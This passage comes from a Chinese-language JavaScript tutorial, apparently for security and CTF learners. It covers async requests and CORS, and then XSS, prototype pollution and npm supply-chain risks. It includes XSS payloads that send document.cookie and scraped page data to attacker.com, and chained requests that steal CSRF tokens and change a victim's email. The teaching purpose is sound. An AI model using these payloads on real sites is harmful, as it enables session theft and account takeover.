    .then(function(response) { return response.json(); })
    .then(function(data) { console.log(data); });
// 如果 api.other.com 的服务器没有设置 CORS 头允许 mysite.com
// 浏览器会拦截这个请求，控制台报错：
// "Access to fetch at '...' from origin '...' has been blocked by CORS policy"
```

**CORS 的两种请求类型：**

**简单请求**（不触发预检）：方法为 GET/HEAD/POST，Content-Type 为表单编码/文本/FormData，没有自定义请求头。

浏览器直接发送请求，服务器在响应头中加 `Access-Control-Allow-Origin` 告诉浏览器"允许哪些源"。浏览器收到响应后检查这个头，如果当前页面不在允许列表中，就拦截。

**复杂请求**（先发预检 OPTIONS）：方法为 PUT/DELETE/PATCH，或 Content-Type 为 JSON，或有自定义请求头。

浏览器先发送一个 OPTIONS 请求（预检），询问服务器"你允不允许来自 XXX 源的 PUT 请求？"。服务器回复允许了，浏览器才发送真正的 PUT 请求。

**预检请求的完整过程：**

```
步骤1: 浏览器准备发 PUT 请求到 https://api.example.com/data
       发现这是"复杂请求"（PUT方法），先不发

步骤2: 浏览器自动发 OPTIONS 请求（预检）：
       OPTIONS /data HTTP/1.1
       Origin: https://mysite.com
       Access-Control-Request-Method: PUT

步骤3: 服务器回复：
       Access-Control-Allow-Origin: https://mysite.com
       Access-Control-Allow-Methods: PUT, DELETE, PATCH

步骤4: 浏览器检查：mysite.com 在允许列表中吗？在，好，允许发真正的请求

步骤5: 浏览器发送真正的 PUT 请求
```

**在 XSS 攻击中，为什么同源策略很重要？**

XSS 让攻击者的脚本在目标网站的域名下执行。这意味着脚本的"源"是目标网站本身，所以：

```javascript
// 当 XSS 脚本在 https://victim.com 的页面中执行时：
// 脚本的"源"是 https://victim.com

// 同源请求：允许——这就是为什么能读取 /my-account 的内容
fetch('https://victim.com/my-account')  // 同源，直接允许
    .then(res => res.text())
    .then(html => {
        // 能读到页面内容，提取CSRF token
    });

// 跨域请求到攻击者服务器：通常被拦截
fetch('https://attacker.com/steal?data=' + document.cookie)  // 跨域，被CORS拦截
    // 浏览器报错，请求被阻止
```

但攻击者仍有办法把数据送出去——比如用 `<img>` 标签或 `mode: 'no-cors'` 绕过部分限制（虽然无法读取响应，但数据通过 URL 送出去了）。

##### AJAX

AJAX 是"Asynchronous JavaScript and XML"的缩写，是 2005 年提出的概念，现在泛指所有"页面不刷新就能和服务器通信"的技术。

```javascript
// 传统 AJAX（jQuery 风格，现在很少新项目用）
$.ajax({
    url: '/api/users',
    type: 'GET',
    dataType: 'json',
    success: function(data) {
        console.log('成功:', data);
    },
    error: function(xhr, status, error) {
        console.log('失败:', error);
    }
});

// 现代 AJAX，就是 Fetch
fetch('/api/users')
    .then(res => res.json())
    .then(data => console.log('成功:', data))
    .catch(error => console.log('失败:', error));
```

**AJAX 的核心价值：** 在 AJAX 出现之前，任何和服务器的交互都需要整页刷新（提交表单 -> 服务器返回新页面 -> 整个页面重新加载）。AJAX 让页面可以"悄悄"和服务器通信，只更新需要变化的部分，用户体验大幅提升。

##### WebSocket

WebSocket 和 XHR/Fetch 有本质区别：它不是"请求-响应"模式，而是建立一个持久连接，双方可以随时互发消息。

```javascript
// 1. 创建 WebSocket 连接
// ws:// 是非加密，wss:// 是加密（类似 http 和 https）
var ws = new WebSocket('wss://chat.example.com');

// 2. 连接建立时触发
ws.onopen = function() {
    console.log('连接已建立！');
    // 可以向服务器发送消息了
    ws.send('Hello Server!');  // 发送文本
    ws.send(JSON.stringify({    // 也可以发JSON
        type: 'message',
        content: '你好'
    }));
};

// 3. 收到服务器消息时触发
ws.onmessage = function(event) {
    console.log('服务器发来消息:', event.data);
    // event.data 是服务器发来的原始数据（字符串）
    var message = JSON.parse(event.data);
    console.log('解析后的消息:', message);
};

// 4. 连接关闭时触发
ws.onclose = function() {
    console.log('连接已关闭');
};

// 5. 发生错误时触发
ws.onerror = function(error) {
    console.log('WebSocket 错误');
};

// 6. 主动关闭连接
ws.close();
```

WebSocket 在 XSS 攻击中不常用，因为它建立的是一个明显的持久连接，容易被检测到。

##### Server-Sent Events (SSE)

SSE 是服务器向浏览器单向推送数据的机制。和 WebSocket 的区别是：SSE 只能服务器发给浏览器（单向），而 WebSocket 是双向的。

```javascript
// 1. 连接服务器的推送端点
var eventSource = new EventSource('/events');

// 2. 收到普通消息时触发
eventSource.onmessage = function(event) {
    console.log('服务器推送:', event.data);
};

// 3. 收到特定类型的事件时触发（服务器可以发不同"类型"的事件）
eventSource.addEventListener('notification', function(event) {
    console.log('收到通知:', event.data);
});

eventSource.addEventListener('alert', function(event) {
    console.log('收到警报:', event.data);
});

// 4. 连接出错时触发
eventSource.onerror = function() {
    console.log('SSE 连接出错，浏览器会自动尝试重连');
    // SSE 默认会自动重连，不需要手动处理
};

// 5. 主动断开连接
eventSource.close();
```

SSE 在安全领域主要用于：如果目标站点使用 SSE 推送敏感数据，XSS 脚本可以监听 EventSource 拦截这些数据。

#### XSS 攻击中的异步请求

XSS 攻击中，异步请求是核心工具。理解了前面的概念，现在来看它们在攻击中的实际应用。

##### 同域请求 vs 跨域请求（攻击视角）

在 XSS 中，你的脚本运行在目标网站的"源"下，所以同域请求天然可行，跨域请求被限制：

| 请求方向 | 示例 | 是否允许 | 原因 |
|---------|------|---------|------|
| 攻击脚本 -> 目标站 | `fetch('/my-account')` | 允许 | 同源，不受任何限制 |
| 攻击脚本 -> 攻击者服务器 | `fetch('https://evil.com/steal')` | 通常被拦截 | 跨域，被 CORS 阻止 |

**把数据送出到攻击者服务器的方法（绕过 CORS 限制）：**

```javascript
// 方法1: 用 img 标签（最常用，GET 方式送数据）
// img 标签加载"图片"不受同源策略限制
new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;

// 方法2: 用 fetch 的 no-cors 模式（发出去但看不到响应）
fetch('https://attacker.com/steal', {
    method: 'POST',
    mode: 'no-cors',  // 告诉浏览器：我不需要读响应，只管发
    body: JSON.stringify({ cookie: document.cookie })
});

// 方法3: 动态创建 form 并提交（可以 POST）
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://attacker.com/steal';
var input = document.createElement('input');
input.name = 'cookie';
input.value = document.cookie;
form.appendChild(input);
document.body.appendChild(form);
form.submit();
```

##### HTTP 请求方法在攻击中的应用

| 方法 | 攻击用途 | 是否携带请求体 |
|------|---------|--------------|
| GET | 读取页面（获取 CSRF token）、探测路径 | 否（数据在 URL） |
| POST | 提交修改（改邮箱、改密码、转账） | 是 |
| PUT | 上传/替换资源 | 是 |
| DELETE | 删除资源 | 可能携带 |

##### Content-Type 在攻击中的选择

```javascript
// 场景：修改邮箱的 POST 请求
// 方式1：表单编码格式（和 HTML form 提交一样，最常用）
fetch('/my-account/change-email', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'email=hacked@evil.com&csrf=' + token
    // body 格式: key1=value1&key2=value2
});

// 方式2：JSON 格式（如果服务器接受 JSON）
fetch('/my-account/change-email', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        email: 'hacked@evil.com',
        csrf: token
    })
});
// 选哪种取决于服务器端怎么接收参数。一般先查看正常请求用什么格式，跟着用。
```

##### 凭证（Cookie）的自动携带

这是 XSS 攻击能成功的关键机制：

```javascript
// 当 XSS 脚本在 https://victim.com 页面中执行时：
// 对 https://victim.com 的任何请求，浏览器会自动附上 victim.com 的 Cookie

// 不需要手动加 Cookie！浏览器帮你加了：
fetch('/my-account/change-email', {
    method: 'POST',
    body: 'email=hacked@evil.com'
});
// 这个请求会自动带上受害者在 victim.com 的所有 Cookie
// 包括会话 Cookie（session cookie）
// 服务器看到有效的会话 Cookie，认为这是合法用户的请求
// -> 邮箱修改成功
```

##### XSS 中的典型异步操作模式

**模式 1：获取页面内容，提取信息**

```javascript
// 先读页面，从中提取 CSRF token
fetch('/my-account')
    .then(function(response) {
        return response.text();  // 拿到页面 HTML 源码
    })
    .then(function(html) {
        // 用正则表达式从 HTML 中提取 token
        var match = html.match(/name="csrf" value="([^"]+)"/);
        if (match) {
            var token = match[1];  // match[0] 是完整匹配，match[1] 是第一个捕获组
            console.log('提取到 token:', token);
            // 拿到 token 后，可以继续下一步攻击...
        }
    });
```

**模式 2：连续两个请求（读 token -> 改邮箱）**

```javascript
// 这是 XSS 绕过 CSRF 保护的经典模式
fetch('/my-account')
    .then(function(response) { return response.text(); })
    .then(function(html) {
        var token = html.match(/name="csrf" value="([^"]+)"/)[1];
        // 拿到 token 后发起修改请求
        return fetch('/my-account/change-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'csrf=' + token + '&email=hacked@evil.com'
        });
    })
    .then(function(response) {
        console.log('邮箱修改请求已发送，状态:', response.status);
    });
```

**模式 3：延迟执行（等页面元素加载完成）**

```javascript
// 有时候 CSRF token 不是立刻出现在 DOM 中的
// 可能由其他 JavaScript 动态生成
// 这时需要等一等再提取

// 方式A：用 setTimeout 延迟（简单粗暴）
setTimeout(function() {
    // 1秒后再去读 token
    fetch('/my-account')
        .then(function(response) { return response.text(); })
        .then(function(html) {
            var token = html.match(/name="csrf" value="([^"]+)"/)[1];
            // ...
        });
}, 1000);  // 延迟1秒

// 方式B：轮询检查（更精确，但代码更复杂）
var checkToken = setInterval(function() {
    fetch('/my-account')
        .then(function(response) { return response.text(); })
        .then(function(html) {
            var match = html.match(/name="csrf" value="([^"]+)"/);
            if (match) {
                clearInterval(checkToken);  // 找到了，停止轮询
                var token = match[1];
                // 继续下一步攻击...
            }
        });
}, 200);  // 每200ms检查一次
```

**模式 4：并行窃取多个页面数据**

```javascript
// 同时读取多个可能包含敏感信息的页面
Promise.all([
    fetch('/my-account').then(r => r.text()),
    fetch('/user/profile').then(r => r.text()),
    fetch('/admin/settings').then(r => r.text())
]).then(function(pages) {
    var accountPage = pages[0];
    var profilePage = pages[1];
    var settingsPage = pages[2];
    // 从三个页面中分别提取敏感信息
    // 打包发送给攻击者
    var allData = {
        csrf: accountPage.match(/name="csrf" value="([^"]+)"/)?.[1],
        email: profilePage.match(/email">([^<]+)</)?.[1],
        // ...
    };
    new Image().src = 'https://attacker.com/steal?data=' + JSON.stringify(allData);
});
```

#### 异步请求的返回值

异步请求立即返回的不是实际数据，而是一个 Promise 对象（或 undefined）。这是初学者最容易困惑的地方。

**为什么不能直接返回数据？**

```javascript
// 你可能希望这样写：
var data = fetch('/api');  // 希望 data 就是服务器返回的数据
console.log(data);          // 希望打印出 {"name": "test"}
// 但实际打印的是: Promise { <pending> }

// 为什么？因为 fetch 执行时：
// 1. 向服务器发起请求
// 2. 这时候数据还在路上，还没到
// 3. fetch 不可能把"还没到的数据"返回给你
// 4. 所以它返回一个"占位符"——Promise 对象
// 5. Promise 说："数据现在没有，但将来会有的，你先拿着这个"
```

**三种方式的返回值对比：**

| 方式 | 调用后立即返回什么 | 实际数据怎么获取 |
|------|-----------------|----------------|
| `fetch(url)` | `Promise { <pending> }` | 通过 `.then(response => response.json())` 获取 |
| `xhr.send()` | `undefined` | 通过 `xhr.onload` 或 `xhr.onreadystatechange` 回调获取 |
| `await fetch(url)` | Promise 完成后返回 Response 对象 | 直接赋值给左边变量（但 await 只能在 async 函数中使用） |

**可视化理解：同步 vs 异步的执行顺序：**

```javascript
// ===== 同步版本（假设存在）=====
console.log('1. 开始');
var data = getSyncData();      // 卡在这里，等数据
console.log('2. 数据:', data);  // 数据到了才执行
console.log('3. 继续');
// 输出: 1 -> (卡住等待...) -> 2 -> 3

// ===== 异步版本（实际）=====
console.log('1. 开始');
var promise = fetch('/api');           // 不卡，拿到 Promise
console.log('2. promise:', promise);    // Promise { <pending> }
promise.then(function(response) {
    console.log('4. 数据到了:', response); // 数据到了才执行
});
console.log('3. 继续');
// 输出: 1 -> 2 -> 3 -> (等待...) -> 4
// 注意：第3步在第4步之前执行！这就是"异步"的核心
```

#### XHR / Fetch / axios 对比

##### 发展历史

```
2000年: XMLHttpRequest 诞生
       IE5 首次引入 ActiveX 对象，后来被其他浏览器标准化为 XMLHttpRequest
       这是浏览器第一次可以"不刷新页面从服务器获取数据"

2005年: AJAX 术语被创造
       Jesse James Garrett 在一篇文章中提出了 AJAX 这个概念
       随后 Google Maps、Gmail 等产品展示了 AJAX 的强大
       XHR 成为 Web 2.0 的标志性技术

2015年: Fetch API 标准化（ES6）
       解决了 XHR 的很多痛点：语法简洁、基于 Promise、更清晰的错误处理
       但有一些"反直觉"的设计（如 HTTP 错误码不会自动 reject）

2015年: axios 发布
       基于 XMLHttpRequest 封装的第三方库
       提供了拦截器、自动 JSON 转换、请求取消等企业级功能
       迅速成为最流行的 HTTP 客户端库

2026年: Fetch + axios 是绝对主流
       XHR 主要存在于：老旧系统维护、特定兼容性需求、CTF/漏洞实验
       新项目中几乎看不到直接使用 XHR 的代码
```

##### 三种方式的详细对比（不只是功能，还有理念差异）

| 对比维度 | XMLHttpRequest | Fetch API | axios |
|---------|:---:|:---:|:---:|
| 出现时间 | 2000年 | 2015年 | 2015年 |
| 是否浏览器原生 | 原生 | 原生 | 第三方库（需引入） |
| 编程风格 | 事件驱动（onload/onerror） | Promise 链式调用 | Promise + 增强功能 |
| async/await 兼容 | 不支持（需手动封装 Promise） | 原生支持 | 原生支持 |
| JSON 处理 | 手动 `JSON.parse(xhr.responseText)` | 手动 `.then(res => res.json())` | 自动解析，直接 `response.data` |
| 请求/响应拦截器 | 不支持 | 不支持 | 支持（统一加 token、统一错误提示） |
| 请求取消 | `xhr.abort()` | 需 `AbortController`（较复杂） | `axios.CancelToken` |
| 上传进度 | `xhr.upload.onprogress` | 不支持（需其他方式） | `config.onUploadProgress` |
| 下载进度 | `xhr.onprogress` | 不支持 | `config.onDownloadProgress` |
| 超时设置 | `xhr.timeout = 5000` | 需手动用 `AbortController` + `setTimeout` | `config.timeout = 5000` |
| 错误处理 | 手动检查 `status` | 仅网络错误才 reject，需手动检查 `ok` | 非 2xx 状态码自动 reject |
| 浏览器兼容 | 所有浏览器 | 现代浏览器（IE 不支持） | 所有浏览器（底层用 XHR） |

##### 为什么 CTF 和漏洞实验中常用 XHR？

1. **没有外部依赖：** XHR 是浏览器原生 API，不需要引入任何库文件。在 XSS 注入场景中，你只能注入一段脚本，不能先 `npm install axios`。

2. **兼容性最广泛：** 目标环境可能是任何浏览器版本，XHR 保证一定能用。

3. **底层机制透明：** 用 XHR 能更清楚地看到请求的每个阶段（readyState 变化），有助于理解 HTTP 请求的本质。Fetch 把很多细节封装了起来。

4. **不会被浏览器插件干扰：** 某些浏览器安全插件会监控 Fetch 请求但不监控 XHR（因为 XHR 太古老，插件作者可能忽略了它）。

##### 实际项目中的选择

| 场景 | 推荐方案 | 原因 |
|------|---------|------|
| 新项目，简单需求 | Fetch | 原生，无依赖，语法清晰 |
| 大型企业项目 | axios | 拦截器、统一的错误处理、自动 JSON 转换 |
| 需要上传进度 | axios | Fetch 不支持，XHR 太繁琐 |
| 需要请求重试 | axios | 配合 axios-retry 插件 |
| 必须兼容 IE11 | axios 或用 XHR | Fetch 在 IE 上不可用 |
| Service Worker 中 | Fetch（唯一选择） | Service Worker 中只能使用 Fetch |
| CTF / 漏洞实验 | XHR 或 Fetch | 看题目要求和目标浏览器环境 |
| Node.js 服务端 | axios 或 node-fetch | 看项目风格 |

#### 异步请求概念关系总图

```
                          JavaScript 异步请求
                                |
          +---------------------+---------------------+
          |                     |                     |
       为什么需要？           三种实现方式            核心机制
          |                     |                     |
    单线程不能卡          +------+------+        +------+------+
    用户体验要好          |      |      |        |      |      |
    耗时操作放后台       XHR   Fetch  axios   回调  Promise  async/await
                       (2000) (2015) (2015)   (最基础) (现代) (最现代)
                          |      |      |
                    事件驱动  Promise  增强Promise
                          |      |      |
                    兼容最好  原生现代  功能最全
                    
                          |
                    周边重要概念
                          |
          +------+------+------+------+
          |      |      |      |      |
        同源策略  CORS  AJAX  WebSocket  SSE
          |      |      |      |      |
        安全基石 跨域方案 旧称   双向实时  服务器推送
```

#### 常见问题

**Q1: 异步请求会阻塞页面吗？**
不会。异步请求在后台进行，不影响页面渲染和用户交互。这就是"异步"和"非阻塞"的核心含义。但要注意：如果回调函数中执行了大量同步计算，那个计算本身会短暂阻塞页面。

**Q2: 为什么异步请求需要回调？**
因为结果的到达时间是未知的——可能 50ms，可能 5秒，可能永远不到。JavaScript 不能"干等"，必须继续执行后面的代码。所以需要一个机制："结果到了通知我"——这就是回调函数。Promise 和 async/await 都是在这个基本思想上构建的更优雅的抽象。

**Q3: async/await 是同步还是异步？**
本质是异步。`await` 那一行看起来像"同步等待"，但底层的机制是：函数在 `await` 处暂停，控制权交还给主线程，等 Promise 完成了再从暂停处恢复执行。只是**写法**看起来像同步而已。

**Q4: 所有异步请求都是 AJAX 吗？**
AJAX 是一个历史术语，泛指"页面不刷新就和服务器通信"。XHR 和 Fetch 都属于 AJAX 的范畴。但 WebSocket 和 SSE 通常不被称为 AJAX，因为它们不是"请求-响应"模式。

**Q5: XSS 中为什么要用异步？**
三个原因：一是不能阻塞受害者浏览器（否则受害者会发现页面卡顿）；二是 Fetch/XHR 可以精确控制请求的各个参数（方法、请求头、请求体）；三是可以在请求之间进行逻辑处理（提取 token -> 发起下一个请求）。

**Q6: XHR 的 onreadystatechange 和 onload 有什么区别？**
`onreadystatechange` 在 readyState 每次变化时触发（会触发多次：1->2->3->4），需要手动检查 `readyState === 4`。`onload` 只在请求成功完成时触发一次（等价于 `readyState === 4` 且 HTTP 状态码为 2xx），不用手动检查 readyState。CTF 中常用 `onreadystatechange` 因为它兼容性最好，且代码意图更明确（你知道自己在检查 readyState）。

### npm / node_modules

npm 是 JS 的包管理器，`node_modules/` 是依赖存放目录——著名的"黑洞"目录，体积可以非常庞大。

```bash
npm install express         # 安装依赖
npm install                 # 根据 package.json 安装所有依赖
npm run dev                 # 运行 package.json 中定义的脚本
```

`package.json` 类似 Python 的 `requirements.txt`，记录项目依赖和脚本。

### 原型继承（不是类继承）

JavaScript 使用原型链（Prototype Chain）而不是传统类的继承：

```javascript
const parent = { greet() { return "Hello"; } };
const child = Object.create(parent);    // child 继承 parent
child.greet();                          // "Hello"（从原型链查找）

// ES6 的 class 语法糖（底层仍然是原型）
class Animal {
    constructor(name) { this.name = name; }
    speak() { return `${this.name} makes a sound.`; }
}
```

---

## 安全相关

### XSS（Cross-Site Scripting）

JavaScript 是 XSS 攻击的核心载体——攻击者向页面注入恶意脚本，在受害者浏览器中执行：

```javascript
// 反射型 XSS：恶意脚本通过 URL 参数传入
// URL: /search?q=<script>fetch('http://attacker.com/?c='+document.cookie)</script>

// DOM 型 XSS：恶意数据被不安全地写入 DOM
document.getElementById('result').innerHTML = userInput;  // 危险
document.getElementById('result').textContent = userInput; // 安全
```

### 原型污染（Prototype Pollution）

JavaScript 特有的攻击方式，通过污染 `__proto__` 影响所有对象：

```javascript
// 攻击者控制的 JSON
const malicious = JSON.parse('{"__proto__": {"is_admin": true}}');

// 不安全的合并
const user = {};
Object.assign(user, malicious);    // 原型被污染

// 后果
const newObj = {};
console.log(newObj.is_admin);      // true（从污染的原型继承）
```

防御：用 `Object.create(null)` 创建无原型对象，或用 Map 代替普通对象。

### npm 供应链攻击

npm 生态的依赖嵌套深、更新频繁，是供应链攻击的高发区：

- 恶意包名仿冒（typosquatting）：`express` → `exprees`
- 依赖混淆：私有包名被公开注册劫持
- 维护者账号被盗：攻击者发布恶意版本的合法包

### `eval()` 和 `new Function()`

```javascript
eval("console.log('任意代码')");          // 危险，可执行任意代码
new Function("return " + userInput)();    // 同样危险
setTimeout("alert(1)", 1000);             // setTimeout 传字符串时会 eval
```

---

## TypeScript

TypeScript 是 JavaScript 的超集，加了类型系统。现在新项目大多用 TypeScript：

```typescript
// .ts 文件
function greet(name: string): string {    // 参数和返回值有类型
    return `Hello, ${name}`;
}

interface User {
    name: string;
    age: number;
}
```

看到 `.ts` 或 `.tsx` 文件就知道是 TypeScript 项目，看到类型注解就知道不是纯 JS。

---

## 简单总结

- **浏览器里唯一能跑的语言**：前端离不开它
- **动态弱类型**：变量不声明类型，`==` 会做类型转换（用 `===`）
- **`let`/`const` + 箭头函数 `=>`**：现代 JS 的标志
- **`node_modules/` 黑洞**：npm 的依赖树，体积惊人
- **XSS 攻击的载体**：理解 XSS 必须先理解 JS
- **原型污染是 JS 特有的漏洞类型**：`__proto__` 是关键
